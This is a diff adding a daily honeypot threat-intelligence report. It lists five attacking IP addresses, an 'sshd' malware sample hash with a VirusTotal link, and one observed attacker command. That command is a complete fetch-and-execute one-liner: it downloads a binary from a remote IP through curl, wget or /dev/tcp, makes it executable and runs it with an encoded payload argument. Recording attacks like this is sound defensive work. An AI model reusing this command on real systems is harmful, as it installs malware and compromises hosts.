@@ -1,0 +1,20 @@
+Top 5 IPs for 17-09-2024 :
+
+193.233.115.12
+154.8.140.116
+121.179.93.147
+149.50.106.170
+8.137.97.155
+
+
+Malware Observed:
+
+File Name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+Commands/exploits observed :
+
+
+cUPX ! ssnohup /bin/bash -c curl http://129.144.180.26:60107/mipsel_linux -o /tmp/oXuNo5pn57; if [ ! -f /tmp/oXuNo5pn57 ]; then wget http://129.144.180.26:60107/mipsel_linux -O /tmp/oXuNo5pn57; fi; if [ ! -f /tmp/oXuNo5pn57 ]; then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /mipsel_linux' >&6 && cat 0<&6 > /tmp/oXuNo5pn57 && chmod +x /tmp/oXuNo5pn57 && /tmp/oXuNo5pn57 SOa0P3Q/u5DXb++aiZeQ6HvVlLshei296Dc08as/eCGknNF76JKIjZr+cNWcpCB8NKv3MjbosTV3J7qV13P+k4uJjOlxzZ2yP385tPwzNfe1PW0gu5XNdeqMiI+Q8HDQkLAnfTy39yUx8as/eSKkldF28JWNg5TucNGRqid8I7TwNSv0tD5jI7md2Xfuk4mIguZv0ZW9P38/teg0PPG/O30gvpDDcO+Sl4ia72/SkqQmeDez9jQ3/6U1YyO7nM1y7IyLi5Tkd9OVuSRtPL30KzTztCN5JaSW1nTklImIlu5h0pa/P3w/seg0PfKrPH4gsJLTcO2bmYiQ7G/Rlrw/eTSr9DU3/LM9fCG5hNtv7JOOl5Drcc2cuCt7PbTyPSX1vCN8J7+K0nXpjICBmOhx0pa/MXk6q/Q2M+i0O3k/u5fQe+iSiIuQ/nnNlrsoYzi06Dcw8787fSC5ncN16YyLipTwcNeQpCN8Ob/wNTTyvC18JL6K22/vlomXk+932ZK6IH00pfIyK/S2O2MgvpDNc++Wg4+S73XahL4mYz+2/is08LMjeSiwktNw7ZWZi5Lub9Kdvz97Oqv+Nz/wtTx5KaqXzXnmjIiAm/Bw1JWwJ308sfYlMfGrP34npJXVcfCTg4+S73DUhLwgYzy2/is0/rAjfyK+ntVx75aBmZPtcs2WviNjO73oNDPzvzt9IL6Qw3LnjIiPl/Bw15OkKHU3s/Y0N/OlNWMju53NdO+Mi4yX5HfTlbkobTu06DQz9qs/fCKkltB45JSJiJLvYdedpCN+Oav/Miv0tDl3J7qV03dbjKmTnwVqzQj/N+I2j0Dpvutp4BTSnixKXu33; fi; echo Aa123456 > /tmp/.opass; chmod +x /tmp/oXuNo5pn57 && /tmp/oXuNo5pn57 SOa0P3Q/u5DXb++aiZeQ6HvVlLshei296Dc08as/eCGknNF76JKIjZr+cNWcpCB8NKv3MjbosTV3J7qV13P+k4uJjOlxzZ2yP385tPwzNfe1PW0gu5XNdeqMiI+Q8HDQkLAnfTy39yUx8as/eSKkldF28JWNg5TucNGRqid8I7TwNSv0tD5jI7md2Xfuk4mIguZv0ZW9P38/teg0PPG/O30gvpDDcO+Sl4ia72/SkqQmeDez9jQ3/6U1YyO7nM1y7IyLi5Tkd9OVuSRtPL30KzTztCN5JaSW1nTklImIlu5h0pa/P3w/seg0PfKrPH4gsJLTcO2bmYiQ7G/Rlrw/eTSr9DU3/LM9fCG5hNtv7JOOl5Drcc2cuCt7PbTyPSX1vCN8J7+K0nXpjICBmOhx0pa/MXk6q/Q2M+i0O3k/u5fQe+iSiIuQ/nnNlrsoYzi06Dcw8787fSC5ncN16YyLipTwcNeQpCN8Ob/wNTTyvC18JL6K22/vlomXk+932ZK6IH00pfIyK/S2O2MgvpDNc++Wg4+S73XahL4mYz+2/is08LMjeSiwktNw7ZWZi5Lub9Kdvz97Oqv+Nz/wtTx5KaqXzXnmjIiAm/Bw1JWwJ308sfYlMfGrP34npJXVcfCTg4+S73DUhLwgYzy2/is0/rAjfyK+ntVx75aBmZPtcs2WviNjO73oNDPzvzt9IL6Qw3LnjIiPl/Bw15OkKHU3s/Y0N/OlNWMju53NdO+Mi4yX5HfTlbkobTu06DQz9qs/fCKkltB45JSJiJLvYdedpCN+Oav/Miv0tDl3J7qV03dbjKmTnwVqzQj/N+I2j0Dpvutp4BTSnixKXu33 &( 2
